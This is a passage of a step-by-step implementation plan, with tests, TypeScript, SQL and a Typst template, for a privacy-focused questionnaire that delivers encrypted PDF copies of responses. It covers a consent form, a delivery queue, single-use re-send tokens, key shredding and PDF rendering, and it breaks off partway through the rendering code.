import { ConsentForm } from '../routes/completion.tsx';

Deno.test('ConsentForm - carries the exact approved copy', () => {
  const html = render(<ConsentForm resumeToken='tok-1' />);
  assertStringIncludes(
    html,
    'Remember this password. No one can reset it. Should you forget it, however, ' +
      'you may request another copy of the pdf be sent to you.',
  );
  assertStringIncludes(html, 'Yes, please');
  assertStringIncludes(html, 'Send me a .pdf email');
  assertStringIncludes(html, 'placeholder="password optional"');
});

Deno.test('ConsentForm - works without JavaScript', () => {
  const html = render(<ConsentForm resumeToken='tok-1' />);
  assertStringIncludes(html, 'method="post"');
  assertStringIncludes(html, 'action="/api/responses/deliver"');
  assert(!html.includes('onclick'), 'no inline JS handlers');
});

// AMENDED 2026-08-11. The original asserted !html.includes('required') across
// the WHOLE form, which the radios legitimately violate -- a guaranteed red.
// Scope the check to the password input itself.
Deno.test('ConsentForm - password field is optional and not autofilled', () => {
  const html = render(<ConsentForm resumeToken='tok-1' />);
  const pw = html.slice(html.indexOf('type="password"'));
  const pwTag = pw.slice(0, pw.indexOf('>'));
  assert(!pwTag.includes('required'), 'password must be optional');
  assertStringIncludes(html, 'autocomplete="new-password"');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/completion_consent_test.tsx`
Expected: FAIL — `ConsentForm` is not exported from `routes/completion.tsx`.

- [ ] **Step 3: Implement the component**

```tsx
/**
 * Consent to receive a PDF copy.
 *
 * No JavaScript: the password panel is revealed by a CSS sibling selector on
 * the checked radio (see public/css/consent.css). The gate is deliberately
 * usable without script and this page must not be the exception.
 */
export function ConsentForm({ resumeToken }: { resumeToken: string }) {
  return (
    <form method='post' action='/api/responses/deliver' class='consent'>
      <input type='hidden' name='resume_token' value={resumeToken} />
      <p class='consent-question'>Would you like a copy of your responses?</p>

      {
        /*
        AMENDED 2026-08-11. The radio must NOT be nested inside the label.
        `.consent-yes:checked ~ .pw-panel` is a sibling combinator, and siblings
        must share a parent -- with the input inside the label its only siblings
        are the <span>, so the panel could never be revealed and the no-JS path
        would silently have no password field at all. Input hoisted to the form,
        label bound by `for`/`id`.
      */
      }
      <input type='radio' name='consent' value='yes' id='consent-yes' class='consent-yes' required />
      <label class='consent-choice' for='consent-yes'>Yes, please</label>

      <div class='pw-panel'>
        <input
          type='password'
          name='password'
          placeholder='password optional'
          autocomplete='new-password'
          maxLength={256}
        />
        <p class='pw-note'>
          Remember this password. No one can reset it. Should you forget it, however, you may request another copy of
          the pdf be sent to you.
        </p>
      </div>

      <input type='radio' name='consent' value='no' id='consent-no' required />
      <label class='consent-choice' for='consent-no'>No</label>

      <button type='submit' class='cta cta-primary'>Send me a .pdf email</button>
    </form>
  );
}
```

Render `<ConsentForm resumeToken={...} />` inside the existing `<main>`, and add
a `handler` that reads the resume token from the cookie into props.

- [ ] **Step 4: Write the CSS**

```css
/* public/css/consent.css
 * The password panel appears only when "Yes, please" is selected. This is a
 * sibling selector rather than a script so the page degrades to a plain form.
 */
.pw-panel {
  display: none;
}
.consent-yes:checked ~ .pw-panel {
  display: block;
}
.pw-note {
  font-size: 0.85rem;
  opacity: 0.8;
  max-width: 42ch;
}
```

Link it from the page head. Note the markup order: `.pw-panel` must be a
following sibling of the `.consent-yes` input for `~` to match.

- [ ] **Step 5: Run tests**

Run: `deno test --allow-net --allow-read --allow-env tests/completion_consent_test.tsx`
Expected: PASS, 3 tests.

- [ ] **Step 6: Verify by eye with JS disabled**

Run: `deno task dev`, open `/completion`, disable JavaScript, confirm the panel
appears on selecting "Yes, please" and the form still submits.

- [ ] **Step 7: Commit**

```bash
deno fmt routes/completion.tsx tests/completion_consent_test.tsx
git add routes/completion.tsx public/css/consent.css tests/completion_consent_test.tsx
git commit -m "feat(completion): consent form for PDF delivery, no JS required"
```

---

## Task 8: Delivery endpoint

**Files:**

- Create: `routes/api/responses/deliver.ts`
- Create: `lib/romania-client.ts`
- Test: `tests/deliver_bundle_test.ts` (create)

**Interfaces:**

- Consumes: `ageEncryptTo` (Task 1), schema (Task 4)
- Produces:
  - `buildBundle(rows, encryptedEmail, encryptedPassword): DeliveryBundle` where `DeliveryBundle = { sessionId: string; answers: Array<{ questionIndex: number; questionText: string; ciphertext: string; skipped: boolean }>; encryptedEmail: string; encryptedPassword: string | null }`
  - `pushBundle(bundle: DeliveryBundle): Promise<void>`

- [ ] **Step 1: Write the failing test**

```ts
// tests/deliver_bundle_test.ts
import { assertEquals, assertThrows } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { buildBundle } from '../routes/api/responses/deliver.ts';

const rows = [
  { question_index: 7, question_text: 'q7', ciphertext: 'ct7', skipped: false },
  { question_index: 0, question_text: 'q0', ciphertext: 'ct0', skipped: false },
  { question_index: 3, question_text: 'q3', ciphertext: 'ct3', skipped: true },
];

Deno.test('buildBundle - orders answers canonically, not chronologically', () => {
  const bundle = buildBundle('sess-1', rows, 'enc-email', null);
  // AMENDED 2026-08-11: always all 35, in canonical order, gaps filled.
  assertEquals(bundle.answers.length, 35);
  assertEquals(bundle.answers.map((a) => a.questionIndex), Array.from({ length: 35 }, (_, i) => i));
});

Deno.test('buildBundle - preserves skipped markers', () => {
  const bundle = buildBundle('sess-1', rows, 'enc-email', null);
  assertEquals(bundle.answers.find((a) => a.questionIndex === 3)?.skipped, true);
});

Deno.test('buildBundle - carries the real ciphertext for answered questions', () => {
  const bundle = buildBundle('sess-1', rows, 'enc-email', null);
  assertEquals(bundle.answers.find((a) => a.questionIndex === 7)?.ciphertext, 'ct7');
});

Deno.test('buildBundle - fills an unreached question rather than shortening the document', () => {
  const bundle = buildBundle('sess-1', rows, 'enc-email', null);
  const missing = bundle.answers.find((a) => a.questionIndex === 20);
  assertEquals(missing?.skipped, true);
  assertEquals(missing?.ciphertext, '');
});

Deno.test('buildBundle - refuses duplicate indices', () => {
  const dupes = [...rows, { question_index: 7, question_text: 'q7', ciphertext: 'other', skipped: false }];
  assertThrows(() => buildBundle('sess-1', dupes, 'enc-email', null), Error, 'duplicate answer');
});

Deno.test('buildBundle - carries no plaintext password', () => {
  const bundle = buildBundle('sess-1', rows, 'enc-email', 'AGE-ARMORED-PW');
  assertEquals(bundle.encryptedPassword, 'AGE-ARMORED-PW');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/deliver_bundle_test.ts`
Expected: FAIL — module does not exist.

- [ ] **Step 3: Implement**

```ts
// routes/api/responses/deliver.ts (excerpt)

export interface BundleAnswer {
  questionIndex: number;
  questionText: string;
  ciphertext: string;
  skipped: boolean;
}

export interface DeliveryBundle {
  sessionId: string;
  answers: BundleAnswer[];
  encryptedEmail: string;
  encryptedPassword: string | null;
}

interface AnswerRow {
  question_index: number;
  question_text: string;
  ciphertext: string;
  skipped: boolean;
}

/**
 * Assemble the bundle Romania will render.
 *
 * Canonical order (0-34), deliberately NOT the order the respondent answered
 * in. The shuffle stays in the session row; the document every respondent
 * receives reads identically.
 */
export function buildBundle(
  sessionId: string,
  rows: AnswerRow[],
  encryptedEmail: string,
  encryptedPassword: string | null,
): DeliveryBundle {
  // AMENDED 2026-08-11: a duplicate index used to survive into the bundle and
  // a missing one used to shorten the document silently. Both produce a PDF
  // that looks complete and is not -- and the respondent has no way to tell,
  // because they cannot remember which of 35 questions they were asked.
  const byIndex = new Map<number, AnswerRow>();
  for (const r of rows) {
    if (byIndex.has(r.question_index)) {
      throw new Error(`duplicate answer for question ${r.question_index}`);
    }
    byIndex.set(r.question_index, r);
  }

  const answers = Array.from({ length: 35 }, (_, questionIndex) => {
    const row = byIndex.get(questionIndex);
    if (row) {
      return {
        questionIndex,
        questionText: row.question_text,
        ciphertext: row.ciphertext,
        skipped: row.skipped,
      };
    }
    // Absent rather than skipped: the respondent never reached it. Synthesized
    // so the document stays numbered against the canonical set -- omitting it
    // would renumber every question after it.
    return {
      questionIndex,
      questionText: CANONICAL_QUESTIONS[questionIndex],
      ciphertext: '',
      skipped: true,
    };
  });

  return { sessionId, answers, encryptedEmail, encryptedPassword };
}
```

The handler: parse the form (both urlencoded and JSON, mirroring
`gate-submit.ts:41`), resolve the session from `resume_token`, and on
`consent=no` redirect to the deletion dialogue without contacting Romania. On
`consent=yes`, encrypt any supplied password with `ageEncryptTo(password.normalize('NFC'), recipients)`,
build the bundle, and `pushBundle` it. If Romania is unreachable, enqueue the
bundle via Task 8b and tell the respondent their copy is queued — **not** that
it has been sent.

> **AMENDED 2026-08-11.** This step originally read "enqueue for retry and still
> return success", which named no queue and contradicted the plan's own
> fail-closed constraint. Decision: build the queue for real (Task 8b) and never
> claim delivery that has not happened.

- [ ] **Step 4: Run tests**

Run: `deno test --allow-net --allow-read --allow-env tests/deliver_bundle_test.ts && deno check main.ts`
Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
deno fmt routes/api/responses/deliver.ts lib/romania-client.ts tests/deliver_bundle_test.ts
git add routes/api/responses/deliver.ts lib/romania-client.ts tests/deliver_bundle_test.ts
git commit -m "feat(deliver): assemble and push the canonical ciphertext bundle"
```

---

## Task 8b: Durable delivery queue

> **Added 2026-08-11.** Task 8 originally hand-waved "enqueue for retry" with no
> queue anywhere in the plan. This task builds it.

**Files:**

- Create: `db/migrations/010_delivery_queue.sql`
- Create: `lib/delivery-queue.ts`, `lib/delivery-worker.ts`
- Test: `tests/delivery_queue_test.ts` (create)

**Interfaces:**

- Consumes: `DeliveryBundle` (Task 8)
- Produces:
  - `enqueue(bundle): Promise<void>`
  - `nextAttemptAt(attempts: number, now: Date): Date` — pure, exponential backoff
  - `claimDue(now, limit): Promise<QueuedBundle[]>`
  - `recordFailure(id, now)` / `recordSuccess(id)`

**Why queuing is safe here:** the bundle is ciphertext end to end. Iceland cannot
read it, so parking it in Postgres leaks nothing that the answers table does not
already hold. The queue stores no plaintext, no address, and no password.

- [ ] **Step 1: Write the failing test**

```ts
// tests/delivery_queue_test.ts
import { assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { DEAD_LETTER_AFTER, nextAttemptAt } from '../lib/delivery-queue.ts';

const now = new Date('2026-08-11T00:00:00Z');

Deno.test('nextAttemptAt - backs off exponentially', () => {
  assertEquals(nextAttemptAt(0, now).toISOString(), '2026-08-11T00:01:00.000Z'); // 1m
  assertEquals(nextAttemptAt(1, now).toISOString(), '2026-08-11T00:04:00.000Z'); // 4m
  assertEquals(nextAttemptAt(2, now).toISOString(), '2026-08-11T00:16:00.000Z'); // 16m
});

Deno.test('nextAttemptAt - caps the interval so retries never stall for days', () => {
  assertEquals(nextAttemptAt(99, now).toISOString(), '2026-08-11T06:00:00.000Z'); // 6h cap
});

Deno.test('dead-letters before the session key is shredded', () => {
  // The key dies at 7 days (Task 10). A bundle still queued past that point can
  // never be rendered, so it must dead-letter while a human can still act.
  assertEquals(DEAD_LETTER_AFTER < 7, true);
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/delivery_queue_test.ts`
Expected: FAIL — `lib/delivery-queue.ts` does not exist.

- [ ] **Step 3: Write the migration**

```sql
-- Durable delivery queue. Ciphertext only: nothing here is readable by Iceland.
CREATE TABLE IF NOT EXISTS delivery_queue (
  id              BIGSERIAL PRIMARY KEY,
  gate_token      TEXT NOT NULL REFERENCES fresh_gate_responses (gate_token) ON DELETE CASCADE,
  bundle          JSONB NOT NULL,
  attempts        INT NOT NULL DEFAULT 0,
  next_attempt_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  dead_lettered   BOOLEAN NOT NULL DEFAULT FALSE,
  last_error      TEXT,
  created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- One live queue entry per session; a re-send replaces rather than duplicates.
CREATE UNIQUE INDEX IF NOT EXISTS idx_delivery_queue_live
  ON delivery_queue (gate_token) WHERE NOT dead_lettered;

CREATE INDEX IF NOT EXISTS idx_delivery_queue_due
  ON delivery_queue (next_attempt_at) WHERE NOT dead_lettered;

COMMENT ON COLUMN delivery_queue.last_error IS
  'Failure CATEGORY only -- never a message that could quote bundle contents.';
```

- [ ] **Step 4: Implement backoff and the claim loop**

`nextAttemptAt` is pure and therefore the only part worth unit-testing:
backoff is `min(60s * 4^attempts, 6h)`. `DEAD_LETTER_AFTER = 5` days, chosen to
land before the 7-day shred so a stuck bundle surfaces while its key still
exists.

`claimDue` must use `SELECT ... FOR UPDATE SKIP LOCKED` so two workers cannot
claim the same row. `recordFailure` stores a failure _category_, never a raw
error string — Romania's errors can quote request context.

- [ ] **Step 5: Run tests**

Run: `deno test --allow-net --allow-read --allow-env tests/delivery_queue_test.ts && deno check main.ts`
Expected: PASS, 3 tests.

- [ ] **Step 6: Commit**

```bash
deno fmt lib/delivery-queue.ts lib/delivery-worker.ts tests/delivery_queue_test.ts
git add db/migrations/010_delivery_queue.sql lib/delivery-queue.ts lib/delivery-worker.ts tests/delivery_queue_test.ts
git commit -m "feat(deliver): durable retry queue with dead-lettering before key shred"
```

---

## Task 9: Forget and re-send

**Files:**

- Create: `routes/api/responses/forget.ts`
- Create: `routes/api/responses/resend/[token].tsx`
- Test: `tests/resend_token_test.ts` (create)

**Interfaces:**

- Consumes: `pdf_resend_tokens` (Task 4)
- Produces: `issueResendToken(gateToken, expiresAt): Promise<string>`, `redeemResendToken(token, now): Promise<{ gateToken: string } | null>`

- [ ] **Step 1: Write the failing test**

```ts
// tests/resend_token_test.ts
import { assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { tokenState } from '../routes/api/responses/resend/[token].tsx';

const future = new Date('2026-09-01T00:00:00Z');
const past = new Date('2026-08-01T00:00:00Z');
const now = new Date('2026-08-15T00:00:00Z');

Deno.test('tokenState - a fresh unexpired token is redeemable', () => {
  assertEquals(tokenState({ expiresAt: future, usedAt: null }, now), 'ok');
});

Deno.test('tokenState - an expired token is refused', () => {
  assertEquals(tokenState({ expiresAt: past, usedAt: null }, now), 'expired');
});

Deno.test('tokenState - a used token is refused (single use)', () => {
  assertEquals(tokenState({ expiresAt: future, usedAt: past }, now), 'used');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-net --allow-read --allow-env tests/resend_token_test.ts`
Expected: FAIL — `tokenState` is not exported.

- [ ] **Step 3: Implement**

```ts
/**
 * A re-send token is a bearer capability that sits in an inbox for a week, so
 * it is single-use and expires with the session key. It never carries a
 * destination: the address is always re-read from the row's encrypted_email,
 * which is what stops a stolen token from becoming an exfiltration primitive.
 */
export function tokenState(
  row: { expiresAt: Date; usedAt: Date | null },
  now: Date,
): 'ok' | 'expired' | 'used' {
  if (row.usedAt !== null) return 'used';
  if (row.expiresAt <= now) return 'expired';
  return 'ok';
}
```

The GET renders a password form (the field must be blank and re-entered — never
defaulted, or a habitual click downgrades the document to unencrypted).

**The POST must claim the token in the database, not via `tokenState`.**
AMENDED 2026-08-11: `tokenState` is a read-then-act check, so two clicks
arriving together both read `used_at IS NULL`, both pass, and both send. It
stays as the function that explains _why_ a token was refused to the user, but
it must never be what authorizes a send:

```ts
// Claim and check in one statement. Whoever gets the row wins; everyone else
// gets zero rows and is told the link was already used.
const claimed = await client.queryObject<{ gate_token: string }>(
  `UPDATE pdf_resend_tokens
      SET used_at = NOW()
    WHERE token = $1
      AND used_at IS NULL
      AND expires_at > NOW()
  RETURNING gate_token`,
  [token],
);
if (claimed.rows.length === 0) {
  // Already used, expired, or revoked by a forget request. Do not distinguish
  // these to the caller -- it would confirm that a token once existed.
  return renderRefusal();
}
```

Only build and push the bundle once that returns a row.

`forget.ts` deletes the `fresh_gate_responses` row (cascading the tokens),
instructs the gate to delete `gate_encrypted_answers` for the session, and asks
Romania to shred the identity. Deletion revokes capabilities immediately rather
than waiting for expiry.

**Deletion spans three systems, so it must not report success early.** Do the
local work (row delete, token revocation) in one transaction, and record a
durable deletion job for the two remote steps. Retry the gate and Romania calls
until each acknowledges; report the deletion complete only when both have. A
"deleted" message shown while the identity still sits on the Romania box is the
same class of lie as the privacy copy this design already had to correct.

- [ ] **Step 4: Run tests**

Run: `deno test --allow-net --allow-read --allow-env tests/resend_token_test.ts && deno check main.ts`
Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
deno fmt routes/api/responses/
git add routes/api/responses/ tests/resend_token_test.ts
git commit -m "feat(responses): address-locked re-send tokens and deletion"
```

---

## Task 10: Romania keystore

**Files:**

- Create: `romania/keystore.ts`
- Test: `romania/tests/keystore_test.ts` (create)

**Interfaces:**

- Produces: `storeIdentity(dir, sessionId, identity)`, `loadIdentity(dir, sessionId): Promise<string>`, `shredIdentity(dir, sessionId)`, `markDelivered(dir, sessionId, at)`, `shredExpired(dir, now, policy: ShredPolicy): Promise<number>` where `ShredPolicy = { afterDelivery: number; absolute: number }`

**Two clocks, not one.** A delivered session's key dies `afterDelivery` days
after its first send; a session that never delivers dies `absolute` days after
the key arrived. Task 14 passes `{ afterDelivery: 7, absolute: 30 }`.

- [ ] **Step 1: Write the failing test**

```ts
// romania/tests/keystore_test.ts
import { assert, assertEquals, assertRejects } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { loadIdentity, markDelivered, shredExpired, shredIdentity, storeIdentity } from '../keystore.ts';

async function tmp(): Promise<string> {
  return await Deno.makeTempDir({ prefix: 'keystore-test-' });
}

Deno.test('storeIdentity - writes 0600 and round-trips', async () => {
  const dir = await tmp();
  await storeIdentity(dir, 'sess-1', 'AGE-SECRET-KEY-1TEST');
  assertEquals(await loadIdentity(dir, 'sess-1'), 'AGE-SECRET-KEY-1TEST');

  const info = await Deno.stat(`${dir}/sess-1.key`);
  assertEquals(info.mode! & 0o777, 0o600, 'identity must not be group/world readable');
});

Deno.test('shredIdentity - removes the key and later loads fail', async () => {
  const dir = await tmp();
  await storeIdentity(dir, 'sess-2', 'AGE-SECRET-KEY-1TEST');
  await shredIdentity(dir, 'sess-2');
  await assertRejects(() => loadIdentity(dir, 'sess-2'));
});

Deno.test('storeIdentity - rejects a session id containing path separators', async () => {
  const dir = await tmp();
  await assertRejects(() => storeIdentity(dir, '../escape', 'k'), Error, 'invalid session id');
});

// AMENDED 2026-08-11: the two clocks below had no coverage. The undelivered
// case in particular was not merely untested -- it did not exist, and keys for
// respondents who declined a copy would have lived on the box forever.

const POLICY = { afterDelivery: 7, absolute: 30 };
const ID = '11111111-2222-3333-4444-555555555555';

Deno.test('shredExpired - keeps a delivered key inside its 7-day window', async () => {
  const dir = await tmp();
  await storeIdentity(dir, ID, 'AGE-SECRET-KEY-1TEST');
  await markDelivered(dir, ID, new Date('2026-08-10T00:00:00Z'));

  assertEquals(await shredExpired(dir, new Date('2026-08-15T00:00:00Z'), POLICY), 0);
  assertEquals(await loadIdentity(dir, ID), 'AGE-SECRET-KEY-1TEST');
});

Deno.test('shredExpired - destroys a delivered key past its window', async () => {
  const dir = await tmp();
  await storeIdentity(dir, ID, 'AGE-SECRET-KEY-1TEST');
  await markDelivered(dir, ID, new Date('2026-08-10T00:00:00Z'));

  assertEquals(await shredExpired(dir, new Date('2026-08-18T00:00:00Z'), POLICY), 1);
  await assertRejects(() => loadIdentity(dir, ID));
});

Deno.test('markDelivered - a re-send never extends the clock', async () => {
  const dir = await tmp();
  await storeIdentity(dir, ID, 'AGE-SECRET-KEY-1TEST');
  await markDelivered(dir, ID, new Date('2026-08-10T00:00:00Z'));
  // A re-send on day 6 must not buy another 7 days.
  await markDelivered(dir, ID, new Date('2026-08-16T00:00:00Z'));

  assertEquals(await shredExpired(dir, new Date('2026-08-18T00:00:00Z'), POLICY), 1);
});

// A corrupt marker must not confer immortality. new Date('garbage').getTime()
// is NaN, and `now >= NaN` is false -- so before the Number.isFinite guard this
// key was skipped on every run, forever.
Deno.test('shredExpired - a corrupt delivery marker falls back to the ceiling', async () => {
  const dir = await tmp();
  await storeIdentity(dir, ID, 'AGE-SECRET-KEY-1TEST');
  await Deno.writeTextFile(`${dir}/${ID}.delivered`, 'not a date at all', { mode: 0o600 });

  // Inside the ceiling: still kept, because the marker is simply ignored.
  assertEquals(await shredExpired(dir, new Date(Date.now() + 3 * 86_400_000), POLICY), 0);
  // Past the ceiling: destroyed, rather than living forever.
  assertEquals(await shredExpired(dir, new Date(Date.now() + 31 * 86_400_000), POLICY), 1);
});

Deno.test('shredExpired - an undelivered key still dies at the absolute ceiling', async () => {
  const dir = await tmp();
  await storeIdentity(dir, ID, 'AGE-SECRET-KEY-1TEST');
  // No marker: the respondent declined, or delivery never succeeded.
  const long = new Date(Date.now() + 31 * 86_400_000);

  assertEquals(await shredExpired(dir, long, POLICY), 1);
  await assertRejects(() => loadIdentity(dir, ID));
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-read --allow-write romania/tests/keystore_test.ts`
Expected: FAIL — module does not exist.

- [ ] **Step 3: Implement**

```ts
// romania/keystore.ts
/**
 * Session identities on the Romania box.
 *
 * Session ids arrive over the network and are used as filenames, so they are
 * validated as UUIDs before touching the filesystem: '../escape' would
 * otherwise write outside the key directory.
 */

const SESSION_ID = /^[0-9a-fA-F-]{8,64}$/;

function keyPath(dir: string, sessionId: string): string {
  if (!SESSION_ID.test(sessionId)) throw new Error('invalid session id');
  return `${dir}/${sessionId}.key`;
}

export async function storeIdentity(dir: string, sessionId: string, identity: string): Promise<void> {
  const path = keyPath(dir, sessionId);
  await Deno.writeTextFile(path, identity, { mode: 0o600 });
  await Deno.chmod(path, 0o600); // umask can weaken the create mode; be explicit.
}

export async function loadIdentity(dir: string, sessionId: string): Promise<string> {
  return (await Deno.readTextFile(keyPath(dir, sessionId))).trim();
}

/**
 * Unlink an identity.
 *
 * AMENDED 2026-08-11: this used to be described as destruction. It is not.
 * Deno.remove unlinks; on a journaling filesystem or an SSD with wear
 * levelling the bytes can survive in a way no userspace call can reach. The
 * real guarantee comes from WHERE the key lives, not from this function: the
 * key directory is a tmpfs mount (see romania/deploy/README.md), so the pages
 * are freed to RAM and never written to persistent storage at all.
 *
 * Keep those two facts together. If anyone ever moves the keystore off tmpfs
 * "temporarily", this call quietly stops meaning what the design claims.
 */
export async function shredIdentity(dir: string, sessionId: string): Promise<void> {
  await Deno.remove(keyPath(dir, sessionId));
  await Deno.remove(`${dir}/${sessionId}.delivered`).catch(() => {});
}

/**
 * Record the first successful delivery for a session.
 *
 * Written once and never rewritten: the 7-day clock runs from the FIRST send
 * and must not extend, or a respondent re-sending every six days keeps a
 * private key alive forever -- the long-lived-key risk per-session keys exist
 * to avoid.
 */
export async function markDelivered(dir: string, sessionId: string, at: Date): Promise<void> {
  const path = `${dir}/${sessionId}.delivered`;
  try {
    // createNew: an existing marker is left exactly as it was.
    await Deno.writeTextFile(path, at.toISOString(), { mode: 0o600, createNew: true });
  } catch (e) {
    if (!(e instanceof Deno.errors.AlreadyExists)) throw e;
  }
}

export interface ShredPolicy {
  /** Days after first successful delivery. The spec's 7. */
  afterDelivery: number;
  /**
   * Absolute ceiling from key creation, for sessions that NEVER deliver.
   *
   * AMENDED 2026-08-11: without this, a respondent who chose "No", abandoned
   * the questionnaire, or hit permanent delivery failure left their key on the
   * box indefinitely -- the one outcome the whole design is built to prevent,
   * reached by the path nobody tested.
   */
  absolute: number;
}

/**
 * Destroy identities past their deadline. Returns how many were removed.
 *
 * Two clocks, and which applies depends on whether the session ever delivered:
 * delivered keys expire afterDelivery days from the marker; undelivered keys
 * expire absolute days from the key file itself.
 */
export async function shredExpired(dir: string, now: Date, policy: ShredPolicy): Promise<number> {
  const DAY = 86_400_000;
  let removed = 0;

  for await (const entry of Deno.readDir(dir)) {
    if (!entry.isFile || !entry.name.endsWith('.key')) continue;
    const sessionId = entry.name.slice(0, -'.key'.length);

    // The absolute ceiling is computed FIRST and always applies. A key must
    // never outlive it, whatever the marker says.
    const info = await Deno.stat(`${dir}/${entry.name}`);
    const born = info.mtime?.getTime() ?? 0;
    let deadline = born + policy.absolute * DAY;

    try {
      const marker = await Deno.readTextFile(`${dir}/${sessionId}.delivered`);
      const delivered = new Date(marker.trim()).getTime();

      // AMENDED 2026-08-11: an unparseable marker yields NaN, and EVERY
      // comparison against NaN is false -- so `now >= deadline` would never
      // fire and the key would live forever. A corrupt timestamp is exactly
      // how the ceiling added to prevent immortal keys gets defeated.
      // Number.isFinite is the guard; on failure we keep the absolute ceiling.
      if (Number.isFinite(delivered)) {
        // Whichever comes first. A delivered key must not gain time relative to
        // an undelivered one just because delivery happened late.
        deadline = Math.min(deadline, delivered + policy.afterDelivery * DAY);
      }
    } catch {
      // No marker: never delivered. The absolute ceiling already stands.
    }

    if (now.getTime() >= deadline) {
      await shredIdentity(dir, sessionId);
      removed++;
    }
  }
  return removed;
}
```

- [ ] **Step 4: Run tests**

Run: `deno test --allow-read --allow-write romania/tests/keystore_test.ts`
Expected: PASS, 7 tests.

- [ ] **Step 5: Commit**

```bash
deno fmt romania/
git add romania/keystore.ts romania/tests/keystore_test.ts
git commit -m "feat(romania): 0600 session keystore with age-based shredding"
```

---

## Task 11: Typst rendering

**Files:**

- Create: `romania/render.ts`, `romania/template.typ`
- Test: `romania/tests/render_test.ts` (create)

**Interfaces:**

- Consumes: decrypted answers
- Produces: `renderPdf(doc: RenderDoc, workDir: string): Promise<Uint8Array>` where `RenderDoc = { entries: Array<{ index: number; tamilNumeral: string; tamil: string; transliteration: string; english: string; answer: string; skipped: boolean }> }`

**Prerequisite:** Noto Sans Tamil must be vendored (Task 15) or Tamil renders as
tofu. Install Typst on the box: `cargo install typst-cli` or the release binary.

**Pin and verify the version before writing code.** Typst's CLI is still moving,
and this task depends on two specifics: that `--root` scopes file reads, and
that `json()` resolves relative to that root. Neither was verifiable when this
plan was written — Typst is not installed on the authoring machine — so confirm
both against the version you install rather than trusting the code below:

```bash
typst --version                     # record it; pin it in the deploy README
typst compile --help | grep -- --root
```

If `json()` turns out to resolve relative to the _file_ rather than the root,
the fix is one line (template and data are already siblings), but find that out
here rather than in Task 14.

- [ ] **Step 1: Write the failing test**

```ts
// romania/tests/render_test.ts
import { assert, assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';
import { renderPdf } from '../render.ts';

const doc = {
  entries: [
    {
      index: 0,
      tamilNumeral: '௧',
      tamil: 'உங்கள் முழுமையான மகிழ்ச்சி என்ன?',
      transliteration: 'uṅkaḷ muḻumaiyāṉa makiḻcci eṉṉa?',
      english: 'What is your idea of perfect happiness?',
      answer: 'Sitting in the garden at dusk.',
      skipped: false,
    },
    {
      index: 1,
      tamilNumeral: '௨',
      tamil: 'உங்கள் மிகப்பெரிய பயம் என்ன?',
      transliteration: 'uṅkaḷ mikapperiya payam eṉṉa?',
      english: 'What is your greatest fear?',
      answer: '',
      skipped: true,
    },
  ],
};

Deno.test('renderPdf - produces a real PDF', async () => {
  const dir = await Deno.makeTempDir({ prefix: 'render-test-' });
  const pdf = await renderPdf(doc, dir);

  assertEquals(new TextDecoder().decode(pdf.slice(0, 5)), '%PDF-');
  assert(pdf.length > 1000, 'a two-question document should not be trivially small');
});

Deno.test('renderPdf - skipped questions still appear', async () => {
  const dir = await Deno.makeTempDir({ prefix: 'render-test-' });
  const pdf = await renderPdf(doc, dir);
  // AMENDED 2026-08-11: stdout was not piped, so res.stdout was always empty
  // and the assertion below could never fail. A test that cannot fail is worse
  // than no test -- it reports coverage of a claim it never checked.
  const child = new Deno.Command('pdftotext', {
    args: ['-', '-'],
    stdin: 'piped',
    stdout: 'piped',
  }).spawn();
  const w = child.stdin.getWriter();
  await w.write(pdf);
  await w.close();
  const res = await child.output();

  const extracted = new TextDecoder().decode(res.stdout);
  assert(extracted.length > 0, 'pdftotext produced nothing - the assertion below would be vacuous');
  assert(extracted.includes('greatest fear'), 'skipped questions must not be omitted');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `deno test --allow-read --allow-write --allow-run romania/tests/render_test.ts`
Expected: FAIL — `romania/render.ts` does not exist.

- [ ] **Step 3: Write the template**

```typst
// romania/template.typ
// AMENDED 2026-08-11. Data is read from a sibling file, NOT from --input.
//
// The original passed the whole decrypted document as a command-line argument.
// Process arguments are world-readable in /proc/<pid>/cmdline on Linux, so
// every respondent's answers were visible to any local user for the lifetime
// of the render -- on the one machine that also holds every private key. The
// rest of this design keeps plaintext on tmpfs and out of logs; that version
// handed it to `ps`.
//
// json() resolves relative to the Typst root, which render.ts sets to the
// tmpfs working directory.
#let doc = json("data.json")

#set document(title: "a formulation of truth", author: "")
#set page(margin: 2.5cm, numbering: "1")
#set text(font: ("Noto Serif", "Noto Sans Tamil"), size: 11pt, lang: "en")
#set par(justify: false, leading: 0.7em)

#align(center)[#text(size: 16pt, tracking: 0.2em)[A FORMULATION OF TRUTH]]
#v(2em)

#for e in doc.entries [
  #block(breakable: false)[
    #text(size: 13pt)[#e.tamilNumeral]
    #v(0.3em)
    #text(font: "Noto Sans Tamil", size: 11pt)[#e.tamil]
    #v(0.2em)
    #text(style: "italic", size: 10pt)[#e.transliteration]
    #v(0.2em)
    #text(size: 10pt)[#e.english]
    #v(0.6em)
    #if e.skipped [
      #text(style: "italic", fill: gray)[(unanswered)]
    ] else [
      #e.answer
    ]
  ]
  #v(1.5em)
]
```

- [ ] **Step 4: Implement the runner**

```ts
// romania/render.ts
/**
 * Typst rendering.
 *
 * Input and output both live in a caller-supplied working directory, which in
 * production is a tmpfs mount: these are the only plaintext bytes in the whole
 * system and they must never reach a disk that survives a reboot.
 */
export interface RenderEntry {
  index: number;
  tamilNumeral: string;
  tamil: string;
  transliteration: string;
  english: string;
  answer: string;
  skipped: boolean;
}

export interface RenderDoc {
  entries: RenderEntry[];
}

const TEMPLATE = new URL('./template.typ', import.meta.url).pathname;

export async function renderPdf(doc: RenderDoc, workDir: string): Promise<Uint8Array> {
  const dataPath = `${workDir}/data.json`;
